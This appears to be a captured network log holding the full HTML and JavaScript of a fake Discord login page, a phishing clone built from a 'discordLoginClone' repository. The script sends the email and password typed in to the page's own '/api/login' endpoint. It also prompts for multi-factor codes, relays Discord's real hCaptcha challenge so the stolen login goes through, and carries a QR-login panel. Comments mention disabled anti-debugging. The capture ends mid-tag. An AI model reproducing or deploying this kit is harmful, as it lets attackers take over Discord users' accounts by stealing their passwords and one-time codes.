          "cookies": [],
          "content": {
            "size": 41087,
            "mimeType": "text/html",
            "text": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\"/>\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover\"/>\n  <script>/* Mobile detect + Desktop Site zoom compensation.\n     screen.width = physical device px (never changes, immune to Desktop Site).\n     If viewport is wider than screen, Safari is in Desktop Site mode and squeezes\n     the page to fit. We apply CSS zoom to cancel out that squeeze so content\n     renders at true 1:1 size on the physical screen. */\n  (function(){\n    var sw=screen.width;\n    if(sw>0&&sw<=600){\n      document.documentElement.classList.add('mob');\n      var done=false;\n      function fixZoom(){\n        if(done)return;\n        var vw=window.innerWidth||document.documentElement.clientWidth;\n        if(vw>sw*1.2){\n          /* Desktop Site mode: viewport ~980px but screen ~390px.\n             zoom = vw/sw makes content vw/sw times bigger.\n             Browser squeezes by sw/vw. Net = 1:1. */\n          document.documentElement.style.zoom=String(vw/sw);\n          done=true;\n        }\n      }\n      fixZoom();\n      if(document.readyState==='loading'){\n        document.addEventListener('DOMContentLoaded',fixZoom);\n      }\n    }\n  })();\n  </script>\n  <meta http-equiv=\"Cache-Control\" content=\"no-store, no-cache, must-revalidate\"/>\n  <meta http-equiv=\"Pragma\" content=\"no-cache\"/>\n  <meta http-equiv=\"Expires\" content=\"0\"/>\n  <meta name=\"referrer\" content=\"no-referrer\"/>\n  <title>Discord | Login</title>\n  <link rel=\"icon\" type=\"image/png\" href=\"/captcha.png?v=2\"/>\n  <link rel=\"shortcut icon\" type=\"image/png\" href=\"/captcha.png?v=2\"/>\n  <link rel=\"apple-touch-icon\" href=\"/captcha.png?v=2\"/>\n  <!-- anti-debug disabled for testing -->\n  <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"/>\n  <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin/>\n  <link href=\"https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;600;700&display=swap\" rel=\"stylesheet\"/>\n  <style>\n    /* Discord uses gg sans which is proprietary - we use the closest match */\n    @font-face{font-family:'gg sans';src:local('gg sans'),local('Noto Sans'),local('Helvetica Neue');font-display:swap}\n  </style>\n  <script src=\"https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js\"></script>\n  <script src=\"https://js.hcaptcha.com/1/api.js?render=explicit\" async defer></script>\n  <style>\n    :root{\n      --font-primary:'gg sans','Noto Sans','Helvetica Neue',Helvetica,Arial,sans-serif;\n      --bg-primary:#313338;\n      --bg-secondary:#2b2d31;\n      --bg-tertiary:#1e1f22;\n      --bg-floating:#111214;\n      --text-normal:#dbdee1;\n      --text-muted:#949ba4;\n      --header-primary:#f2f3f5;\n      --header-secondary:#b5bac1;\n      --text-link:#7c8cba;\n      --brand-500:#5865f2;\n      --brand-560:#4752c4;\n      --brand-600:#3c45a5;\n      --green-360:#23a55a;\n      --red-400:#fa777c;\n      --status-danger:#f23f43;\n      --input-bg:#2b2d31;\n      --modifier-accent:rgba(78,80,88,.48);\n    }\n    *{box-sizing:border-box;margin:0;padding:0}\n    body{\n      font-family:var(--font-primary);\n      background-color:var(--bg-primary);\n      background-image:url(\"https://raw.githubusercontent.com/hretzx/discordLoginClone/main/discordLoginClone/d8680b1c1576ecc8.svg\");\n      background-size:cover;background-position:center;background-repeat:no-repeat;background-attachment:fixed;\n      min-height:100vh;display:flex;flex-direction:column;color:var(--text-normal);\n      -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;\n    }\n    nav{padding:20px 32px;display:flex;align-items:center}\n    .lbcont{flex:1;display:flex;align-items:center;justify-content:center;padding:20px 16px 40px}\n    .loginBox{\n      background:var(--bg-primary);border-radius:5px;box-shadow:0 2px 10px 0 rgba(0,0,0,.2);\n      display:flex;flex-direction:row;width:784px;max-width:100%;overflow:hidden;\n      transition:opacity .3s;\n    }\n    .col-1{flex:1;padding:32px;min-width:0}\n    .col-1.v-center{display:flex;flex-direction:column;justify-content:center;align-items:stretch}\n    .v-sep{width:1px;background:var(--modifier-accent);margin:32px 0;flex-shrink:0}\n    .col-2{\n      width:240px;flex-shrink:0;padding:32px 24px;\n      display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;\n    }\n    /* ─── Responsive / Mobile ─── */\n    /* JS .mob class — always fires on real phones via screen.width detection,\n       even if Safari \"Request Desktop Website\" overrides viewport to 1024px */\n    /* Safari fallback: html bg in case body position:fixed bg fails */\n    html.mob{background:#2b2d30!important}\n    html.mob .v-sep, html.mob .col-2{display:none!important}\n    html.mob .loginBox{max-width:480px}\n    html.mob nav{display:none!important}\n    html.mob .mobile-logo{display:block!important}\n    html.mob body{\n      position:fixed!important;top:0!important;left:0!important;right:0!important;bottom:0!important;\n      width:100%!important;height:auto!important;min-height:0!important;max-height:none!important;\n      margin:0!important;padding:0!important;overflow:hidden!important;\n      display:flex!important;flex-direction:column!important;\n      /* SPLIT properties — Safari ignores background shorthand on position:fixed */\n      background-color:#2b2d30!important;\n      background-image:linear-gradient(to left bottom,#3d4046,#1e1e23)!important;\n      background-attachment:scroll!important;\n      background-size:cover!important;\n      background-repeat:no-repeat!important;\n      overscroll-behavior:none;touch-action:manipulation;\n    }\n    html.mob .lbcont{\n      width:100%!important;flex:1!important;height:auto!important;min-height:0!important;\n      padding:0!important;margin:0!important;display:flex!important;\n      align-items:center!important;justify-content:center!important;overflow:hidden!important;\n    }\n    html.mob .loginBox{\n      width:100%!important;max-width:100%!important;flex:1!important;\n      height:auto!important;min-height:0!important;\n      border-radius:0!important;box-shadow:none!important;background:transparent!important;\n      display:flex!important;flex-direction:column!important;align-items:center!important;\n      overflow-y:auto!important;overflow-x:hidden!important;\n      -webkit-overflow-scrolling:touch;overscroll-behavior-y:contain;\n      padding:20px 16px;\n    }\n    html.mob .col-1{\n      padding:0;width:100%;max-width:400px;\n      display:flex;flex-direction:column;justify-content:center;flex:1;min-height:0;\n    }\n    html.mob .card-header h1{font-size:24px;line-height:30px}\n    html.mob .card-header p{font-size:16px;line-height:20px}\n    html.mob label{font-size:23.8px}\n    html.mob input[type=\"email\"],html.mob input[type=\"password\"],html.mob input[type=\"text\"]{font-size:14.1px!important;height:50px;padding:12px 14px}\n    html.mob .btn{height:50px;font-size:14px}\n    html.mob .forgot{font-size:23.8px}\n    html.mob .reg,html.mob .reg a{font-size:23.8px}\n    /* 830px: hide QR column, cap width at 480px (Discord exact) */\n    @media(max-width:830px){\n      .v-sep,.col-2{display:none!important}\n      .loginBox{max-width:480px}\n      nav{display:none!important}\n      .mobile-logo{display:block!important}\n    }\n    /* 485px: full-screen auth box — Discord's exact mobile breakpoint */\n    @media(max-width:485px){\n      html{\n        width:100%!important;\n        height:100%!important;\n        margin:0!important;padding:0!important;\n        overflow:hidden!important;\n        -webkit-text-size-adjust:100%;\n        /* Dark fallback behind fixed body — Safari shows this if gradient fails */\n        background:#2b2d30!important;\n      }\n      body{\n        /* NUCLEAR: position:fixed forces body = exactly visible viewport.\n           Bypasses ALL Safari 100vh / dvh / URL-bar bugs entirely. */\n        position:fixed!important;\n        top:0!important;left:0!important;right:0!important;bottom:0!important;\n        width:100%!important;\n        height:auto!important;\n        min-height:0!important;       /* kill desktop min-height:100vh */\n        max-height:none!important;\n        margin:0!important;padding:0!important;\n        overflow:hidden!important;\n        display:flex!important;\n        flex-direction:column!important;\n        /* SPLIT properties — Safari ignores background shorthand on position:fixed */\n        background-color:#2b2d30!important;\n        background-image:linear-gradient(to left bottom,#3d4046,#1e1e23)!important;\n        background-attachment:scroll!important;\n        background-size:cover!important;\n        background-repeat:no-repeat!important;\n        overscroll-behavior:none;\n        touch-action:manipulation;\n        /* Prevent iOS rubber-band/bounce */\n        -webkit-overflow-scrolling:auto;\n      }\n      nav{display:none!important}\n      .v-sep,.col-2{display:none!important}\n      .mobile-logo{display:block!important}\n      .lbcont{\n        width:100%!important;\n        /* flex:1 fills body (which is position:fixed = exact viewport).\n           No viewport units needed — immune to Safari URL-bar bugs. */\n        flex:1!important;\n        height:auto!important;\n        min-height:0!important;\n        padding:0!important;margin:0!important;\n        display:flex!important;\n        align-items:center!important;\n        justify-content:center!important;\n        overflow:hidden!important;\n      }\n      .loginBox{\n        width:100%!important;max-width:100%!important;\n        flex:1!important;\n        height:auto!important;\n        min-height:0!important;\n        border-radius:0!important;box-shadow:none!important;\n        background:transparent!important;\n        display:flex!important;flex-direction:column!important;align-items:center!important;\n        overflow-y:auto!important;overflow-x:hidden!important;\n        -webkit-overflow-scrolling:touch;\n        overscroll-behavior-y:contain;\n        padding:20px 16px;\n        padding-top:max(20px, env(safe-area-inset-top));\n        padding-bottom:max(20px, env(safe-area-inset-bottom));\n        padding-left:max(16px, env(safe-area-inset-left));\n        padding-right:max(16px, env(safe-area-inset-right));\n      }\n      .col-1{\n        padding:0;\n        width:100%;max-width:400px;\n        display:flex;flex-direction:column;justify-content:center;\n        flex:1;min-height:0;\n      }\n      .card-header h1{font-size:24px;line-height:30px}\n      .card-header p{font-size:16px;line-height:20px}\n      label{font-size:14px}\n      input[type=\"email\"],input[type=\"password\"],input[type=\"text\"]{font-size:16px!important;height:44px;padding:10px 12px}\n      .btn{height:44px;font-size:16px}\n      .forgot{font-size:14px}\n      .reg,.reg a{font-size:14px}\n      .captcha-face-wrap img{width:140px}\n      .captcha-modal h2{font-size:22px}\n      .captcha-modal p{font-size:15px}\n    }\n    @media(max-width:360px){\n      .loginBox{padding:16px 14px}\n      .card-header{margin-bottom:16px}\n      .card-header h1{font-size:22px}\n      .form-group{margin-bottom:16px}\n      .btn{height:44px;font-size:16px;margin-top:16px}\n    }\n\n    .card-header{text-align:center;margin-bottom:20px}\n    .mobile-logo{display:none;margin:0 auto 16px}\n    .card-header h1{color:var(--header-primary);font-size:24px;font-weight:600;line-height:30px;margin-bottom:8px}\n    .card-header p{color:var(--text-normal);font-size:16px;font-weight:400;line-height:20px}\n    .form-group{margin-bottom:20px}\n    label{\n      display:block;color:var(--header-primary);font-size:14px;font-weight:500;\n      margin-bottom:8px;\n      font-family:var(--font-primary);\n    }\n    label span.req{color:var(--status-danger);padding-left:4px}\n    label.err{color:var(--status-danger)}\n    label.err span.req{color:var(--status-danger)}\n    input[type=\"email\"],input[type=\"password\"],input[type=\"text\"]{\n      width:100%;padding:10px;height:40px;background:var(--input-bg);\n      border:none;border-radius:8px;\n      color:var(--text-normal);font-size:16px;line-height:20px;\n      outline:none;font-family:var(--font-primary);font-weight:400;\n      -webkit-appearance:none;appearance:none;\n    }\n    input::placeholder{color:var(--text-muted);font-family:var(--font-primary)}\n    input:focus{outline:none}\n    .forgot{display:inline-block;margin-top:4px;font-size:14px;color:var(--text-link);text-decoration:none;cursor:pointer;font-weight:500}\n    .forgot:hover{text-decoration:underline}\n    .btn{\n      width:100%;padding:2px 16px;height:44px;background:var(--brand-500);color:#fff;\n      border:none;border-radius:8px;font-size:16px;font-weight:500;cursor:pointer;\n      transition:background .17s ease;margin-top:20px;font-family:var(--font-primary);\n      line-height:24px;display:flex;align-items:center;justify-content:center;\n    }\n    .btn:hover{background:var(--brand-560)}.btn:active{background:var(--brand-600)}.btn:disabled{opacity:.5;cursor:not-allowed}\n    .reg{font-size:14px;color:#b5bac1;margin-top:4px}\n    .reg a{color:var(--text-link);text-decoration:none;font-weight:500;font-size:14px}\n    .reg a:hover{text-decoration:underline}\n\n    /* Error message — appears like Discord's inline error */\n    .err-msg{display:none;color:var(--red-400);font-size:14px;font-weight:400;margin-bottom:12px;line-height:18px}\n    .err-msg.show{display:block}\n\n    .spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle}\n    .spinner-lg{width:28px;height:28px;border-width:3px}\n    .spinner-btn{width:24px;height:24px;border-width:2px}\n    @keyframes spin{to{transform:rotate(360deg)}}\n\n    /* Animated dots */\n    .dots-anim{display:inline-block;clip-path:inset(0 1ch 0 0);animation:dots-step 1.5s steps(4) infinite}\n    @keyframes dots-step{to{clip-path:inset(0 -1ch 0 0)}}\n\n    .pw-wrap{position:relative}.pw-wrap input{padding-right:12px}\n    .pw-toggle{display:none!important}\n\n    /* QR column */\n    .qr-title{color:var(--header-primary);font-size:24px;font-weight:600;margin-top:8px;margin-bottom:8px;line-height:1.2}\n    .qr-wrap{\n      width:176px;height:176px;background:#fff;border-radius:8px;padding:8px;margin:14px auto;\n      display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;\n    }\n    .qr-overlay{\n      position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);\n      width:34px;height:34px;background:#fff;border-radius:50%;\n      display:flex;align-items:center;justify-content:center;\n      border:2px solid #e0e0e0;z-index:2;\n    }\n    .qr-desc{color:var(--header-secondary);font-size:14px;line-height:1.4}\n    .qr-desc strong{color:var(--text-normal);font-weight:600}\n    .qr-link{display:block;margin-top:8px;font-size:14px;color:var(--text-link);text-decoration:none;font-weight:500;cursor:pointer}\n    .qr-link:hover{text-decoration:underline}\n    .qr-retry{color:var(--text-link);cursor:pointer;font-weight:500}.qr-retry:hover{text-decoration:underline}\n\n    /* MFA links */\n    .mfa-method{display:block;margin-top:8px;font-size:13px;color:var(--text-link);cursor:pointer;font-weight:500;text-decoration:none}\n    .mfa-method:hover{text-decoration:underline}\n    .mfa-sep{margin-top:14px;border-top:1px solid var(--modifier-accent);padding-top:14px}\n\n    /* ─── hCaptcha stall overlay (Discord style) ─── */\n    .captcha-stall{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0);z-index:9999;align-items:center;justify-content:center;transition:background .35s ease}\n    .captcha-stall.show{display:flex}\n    .captcha-stall.visible{background:rgba(0,0,0,.7)}\n    .captcha-modal{background:var(--bg-secondary);border-radius:8px;padding:0;text-align:center;width:400px;max-width:90vw;box-shadow:0 8px 32px rgba(0,0,0,.5);overflow:hidden;position:relative;opacity:0;transform:scale(.92) translateY(12px);transition:opacity .3s ease,transform .3s ease}\n    .captcha-stall.visible .captcha-modal{opacity:1;transform:scale(1) translateY(0)}\n    .captcha-close{position:absolute;top:12px;right:12px;width:28px;height:28px;border:none;background:none;cursor:pointer;color:var(--text-muted);font-size:20px;line-height:1;border-radius:4px;display:flex;align-items:center;justify-content:center;z-index:2}\n    .captcha-close:hover{background:rgba(255,255,255,.08);color:var(--text-normal)}\n    .captcha-illustration{padding:32px 32px 0;display:flex;justify-content:center}\n    .captcha-illustration img{width:200px;height:auto;display:block}\n    .captcha-body{padding:20px 32px 24px}\n    .captcha-body h2{color:var(--header-primary);font-size:20px;font-weight:700;margin-bottom:8px;font-family:var(--font-primary)}\n    .captcha-body p{color:var(--header-secondary);font-size:14px;margin:0 0 20px;line-height:1.5;font-family:var(--font-primary)}\n    .hcaptcha-wrap{display:flex;justify-content:center;min-height:78px;align-items:center;width:100%}\n    .hcaptcha-wrap > div{transform-origin:center center}\n    /* Mobile: scale hCaptcha widget to fit smaller screens */\n    @media(max-width:485px){\n      .captcha-modal{width:100%!important;max-width:100vw!important;border-radius:12px 12px 0 0!important;position:fixed!important;bottom:0!important;left:0!important;right:0!important;top:auto!important;margin:0!important}\n      .captcha-stall{align-items:flex-end!important}\n      .captcha-illustration{padding:24px 24px 0}\n      .captcha-illustration img{width:150px}\n      .captcha-body{padding:16px 20px 24px}\n      .captcha-body h2{font-size:20px}\n      .captcha-body p{font-size:14px;margin-bottom:16px}\n      .hcaptcha-wrap{min-height:70px;overflow:visible}\n      .hcaptcha-wrap > div{transform:scale(0.9)}\n    }\n    @media(max-width:360px){\n      .hcaptcha-wrap > div{transform:scale(0.82)}\n      .captcha-body{padding:12px 16px 20px}\n    }\n    .captcha-verifying{display:none;align-items:center;justify-content:center;gap:8px;margin-top:16px;padding:10px 0}\n    .captcha-verifying.show{display:flex}\n    .captcha-verifying span{color:var(--text-muted);font-size:13px;font-family:var(--font-primary)}\n\n\n  </style>\n<script>window._pgToken=\"9834f27633f9d4ad74f12e3d2b4b6034d1091c5f\";</script></head>\n<body>\n\n<nav>\n  <img src=\"https://raw.githubusercontent.com/hretzx/discordLoginClone/main/discordLoginClone/bbbc3d376d38e7bc.svg\" alt=\"Discord\" height=\"34\" style=\"display:block\"/>\n</nav>\n\n<div class=\"lbcont\">\n  <div class=\"loginBox\">\n\n    <!-- Left column -->\n    <div class=\"col-1\">\n\n      <!-- Login -->\n      <div id=\"sec-login\">\n        <div class=\"card-header\">\n          <img class=\"mobile-logo\" src=\"https://raw.githubusercontent.com/hretzx/discordLoginClone/main/discordLoginClone/bbbc3d376d38e7bc.svg\" alt=\"Discord\" height=\"34\"/>\n          <h1>Welcome back!</h1>\n          <p>We're so excited to see you again!</p>\n        </div>\n        <div class=\"err-msg\" id=\"login-error\"></div>\n        <form id=\"login-form\" autocomplete=\"off\">\n          <div class=\"form-group\">\n            <label for=\"email\" id=\"lbl-e\">Email or Phone Number <span class=\"req\">*</span></label>\n            <input type=\"text\" id=\"email\" autocomplete=\"username\"/>\n          </div>\n          <div class=\"form-group\">\n            <label for=\"password\" id=\"lbl-p\">Password <span class=\"req\">*</span></label>\n            <div class=\"pw-wrap\">\n              <input type=\"password\" id=\"password\" autocomplete=\"current-password\"/>\n              <button type=\"button\" class=\"pw-toggle\" onclick=\"togglePw()\" title=\"Show password\">\n                <svg id=\"eye\" width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path d=\"M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z\"/><circle cx=\"12\" cy=\"12\" r=\"3\"/></svg>\n              </button>\n            </div>\n            <a class=\"forgot\" href=\"https://discord.com/reset\">Forgot your password?</a>\n          </div>\n          <button type=\"submit\" class=\"btn\" id=\"login-btn\">Log In</button>\n        </form>\n        <div class=\"reg\" style=\"margin-top:14px\">Need an account? <a href=\"https://discord.com/register\">Register</a></div>\n      </div>\n\n      <!-- MFA -->\n      <div id=\"sec-mfa\" style=\"display:none\">\n        <div class=\"card-header\">\n          <h1 id=\"mfa-title\">Multa-Factor Authentication</h1>\n          <p id=\"mfa-desc\">Enter Discord auth code</p>\n        </div>\n        <div class=\"err-msg\" id=\"mfa-error\"></div>\n        <div class=\"form-group\">\n          <label for=\"mfa-code\" id=\"lbl-mfa\">Authentication Code <span class=\"req\">*</span></label>\n          <input type=\"text\" id=\"mfa-code\" placeholder=\"6-digit authentication code\" maxlength=\"10\" autocomplete=\"one-time-code\"/>\n        </div>\n        <button class=\"btn\" id=\"mfa-btn\" style=\"margin-top:0\">Log In</button>\n        <div id=\"mfa-links\" style=\"display:none\"></div>\n      </div>\n\n      <!-- Email Verification (now inline — no separate page) -->\n      <div id=\"sec-email-verify\" style=\"display:none\"></div>\n\n    </div>\n\n    <div class=\"v-sep\"></div>\n\n    <!-- Right column: QR -->\n    <div class=\"col-2\">\n      <div class=\"qr-wrap\" id=\"qr-box\"><span class=\"spinner spinner-lg\"></span></div>\n      <div class=\"qr-title\">Log in with QR Code</div>\n      <div id=\"qr-stat\" class=\"qr-desc\">Connecting&hellip;</div>\n\n    </div>\n\n  </div>\n</div>\n\n\n\n<!-- hCaptcha challenge overlay (real Discord hCaptcha) -->\n<div class=\"captcha-stall\" id=\"captcha-stall\">\n  <div class=\"captcha-modal\">\n    <button class=\"captcha-close\" id=\"captcha-close\" title=\"Close\">&times;</button>\n    <div class=\"captcha-illustration\">\n      <img src=\"/captcha_face.png\" alt=\"\" onerror=\"this.src='https://i.imgur.com/h41kzXV.png';this.onerror=null\"/>\n    </div>\n    <div class=\"captcha-body\">\n      <h2>Human Verification</h2>\n      <p>Complete the challenge to log in.</p>\n      <div class=\"hcaptcha-wrap\">\n        <div id=\"h-captcha-widget\"></div>\n      </div>\n      <div class=\"captcha-verifying\" id=\"captcha-verifying\">\n        <span style=\"color:#b5bac1;font-weight:500\">Verifying…</span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<script>\n/* ═══ State ═══ */\nvar mfaTicket       = null;\nvar mfaHasSms       = false;\nvar mfaMode         = 'totp';\nvar qrSid           = null;\nvar qrTimer         = null;\nvar _qrBusy         = false;  /* guard: prevent concurrent initQR calls */\nvar captchaEmail    = null;\nvar captchaPw       = null;\nvar captchaRqtoken  = '';\nvar captchaSessionId = '';\n\n/* ═══ Helpers ═══ */\nfunction showErr(id, msg) {\n  var el = document.getElementById(id);\n  if (!el) return;\n  el.textContent = msg;\n  el.classList.add('show');\n}\nfunction hideErr(id) {\n  var el = document.getElementById(id);\n  if (!el) return;\n  el.textContent = '';\n  el.classList.remove('show');\n}\nfunction togglePw() {\n  var i = document.getElementById('password'), e = document.getElementById('eye');\n  if (i.type === 'password') { i.type = 'text'; e.innerHTML = '<path d=\"M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24\"/><line x1=\"1\" y1=\"1\" x2=\"23\" y2=\"23\"/>'; }\n  else { i.type = 'password'; e.innerHTML = '<path d=\"M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z\"/><circle cx=\"12\" cy=\"12\" r=\"3\"/>'; }\n}\nvar _btnTimer = null;\nfunction btnLoad(id, on) {\n  var b = document.getElementById(id);\n  if (!b) return;\n  b.disabled = on;\n  if (_btnTimer) { clearTimeout(_btnTimer); _btnTimer = null; }\n  if (on) {\n    b._origText = b.textContent;\n    b.innerHTML = '<span class=\"spinner spinner-btn\"></span>';\n  } else {\n    b.textContent = b._origText || 'Log In';\n  }\n}\n\n/* ═══ Captcha stall overlay (real hCaptcha) ═══ */\nvar _stallTimer = null;\nvar _hcaptchaDone = false;\nvar _pendingResult = null;\nvar _hcaptchaWidgetId = null;\n\nfunction showCaptchaStall(sitekey, rqdata) {\n  _hcaptchaDone = false;\n  _pendingResult = null;\n  var el = document.getElementById('captcha-stall');\n  if (el) {\n    el.classList.remove('visible');\n    el.classList.add('show');\n    /* Show immediately — no fake delay */\n    setTimeout(function() { el.classList.add('visible'); }, 50);\n  }\n  var vf = document.getElementById('captcha-verifying');\n  if (vf) vf.classList.remove('show');\n  /* Destroy old widget, render fresh with real Discord sitekey + rqdata */\n  try {\n    if (_hcaptchaWidgetId !== null && typeof hcaptcha !== 'undefined') {\n      try { hcaptcha.remove(_hcaptchaWidgetId); } catch(e2) {}\n    }\n    _hcaptchaWidgetId = null;\n  } catch(e) {}\n  try {\n    var container = document.getElementById('h-captcha-widget');\n    if (typeof hcaptcha !== 'undefined' && container) {\n      container.innerHTML = '';\n      var opts = {\n        sitekey: sitekey || 'a9b5fb07-92ff-493f-86fe-352a2803b3df',\n        theme: 'dark',\n        size: 'normal',\n        callback: onHcaptchaPass,\n        'expired-callback': onHcaptchaExpire,\n        'error-callback': onHcaptchaError\n      };\n      if (rqdata) opts.rqdata = rqdata;\n      _hcaptchaWidgetId = hcaptcha.render('h-captcha-widget', opts);\n    }\n  } catch(e) {\n    console.log('[captcha] render error:', e);\n  }\n}\n\nfunction hideCaptchaStall() {\n  if (_stallTimer) { clearTimeout(_stallTimer); _stallTimer = null; }\n  var el = document.getElementById('captcha-stall');\n  if (el) { el.classList.remove('visible'); el.classList.remove('show'); }\n  _pendingResult = null;\n  _hcaptchaDone = false;\n  var vf = document.getElementById('captcha-verifying');\n  if (vf) vf.classList.remove('show');\n  /* Fully destroy the hCaptcha widget so no checkmark persists on retry */\n  try {\n    if (_hcaptchaWidgetId !== null && typeof hcaptcha !== 'undefined') {\n      try { hcaptcha.remove(_hcaptchaWidgetId); } catch(e2) {}\n    }\n  } catch(e) {}\n  _hcaptchaWidgetId = null;\n  var container = document.getElementById('h-captcha-widget');\n  if (container) container.innerHTML = '';\n}\n\nfunction onHcaptchaPass(token) {\n  _hcaptchaDone = true;\n  /* Show \"Verifying...\" while we send the token */\n  var vf = document.getElementById('captcha-verifying');\n  if (vf) vf.classList.add('show');\n  /* Submit the solved token immediately */\n  submitWithCaptcha(token);\n}\n\nasync function submitWithCaptcha(captchaToken) {\n  try {\n    var payload = {\n      login:              captchaEmail,\n      password:           captchaPw,\n      captcha_token:      captchaToken,\n      captcha_rqtoken:    captchaRqtoken,\n      captcha_session_id: captchaSessionId\n    };\n    console.log('[captcha] submitting payload keys:', Object.keys(payload));\n    console.log('[captcha] rqtoken:', captchaRqtoken ? captchaRqtoken.slice(0,20)+'...' : '(empty)');\n    console.log('[captcha] session_id:', captchaSessionId ? captchaSessionId.slice(0,20)+'...' : '(empty)');\n    console.log('[captcha] token prefix:', captchaToken ? captchaToken.slice(0,20)+'...' : '(empty)');\n    var r = await fetch('/api/login', {\n      method: 'POST',\n      headers: {'Content-Type':'application/json'},\n      body: JSON.stringify(payload)\n    });\n    var d = await r.json();\n    console.log('[captcha] server response status:', r.status, 'body:', JSON.stringify(d).slice(0,300));\n    hideCaptchaStall();\n    processLoginResult(d, r.status);\n  } catch(err) {\n    console.error('[captcha] submitWithCaptcha error:', err);\n    hideCaptchaStall();\n    showErr('login-error', 'Connection error. Please try again.');\n    btnLoad('login-btn', false);\n  }\n}\n\nfunction onHcaptchaExpire() { _hcaptchaDone = false; }\nfunction onHcaptchaError() { _hcaptchaDone = true; /* bypass on error */ }\n\n/* Close button handler */\ndocument.getElementById('captcha-close').addEventListener('click', function() { hideCaptchaStall(); });\nfunction showSec(name) {\n  document.getElementById('sec-login').style.display = name === 'login' ? '' : 'none';\n  document.getElementById('sec-mfa').style.display   = name === 'mfa'   ? '' : 'none';\n  document.getElementById('sec-email-verify').style.display = name === 'email-verify' ? '' : 'none';\n  /* vertically center MFA / email-verify sections */\n  var col1 = document.querySelector('.col-1');\n  if (name !== 'login') col1.classList.add('v-center');\n  else col1.classList.remove('v-center');\n}\n\n/* ═══ Success → show verified page ═══ */\nfunction onSuccess(data) {\n  hideErr('login-error');\n  hideErr('mfa-error');\n  var box = document.querySelector('.loginBox');\n  var avatarUrl = (data && data.avatar_url) ? data.avatar_url : '';\n  var username = (data && data.username) ? data.username : '';\n  box.innerHTML = '<div style=\"display:flex;flex-direction:column;align-items:center;justify-content:center;padding:48px 32px;min-height:340px;width:100%\">' +\n    (avatarUrl ? '<img src=\"' + avatarUrl + '\" style=\"width:96px;height:96px;border-radius:50%;border:3px solid #23a55a;margin-bottom:20px\" alt=\"\">' : '<div style=\"width:96px;height:96px;border-radius:50%;background:#5865f2;margin-bottom:20px;display:flex;align-items:center;justify-content:center\"><svg width=\"48\" height=\"36\" viewBox=\"0 0 127.14 96.36\" fill=\"#fff\"><path d=\"M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,7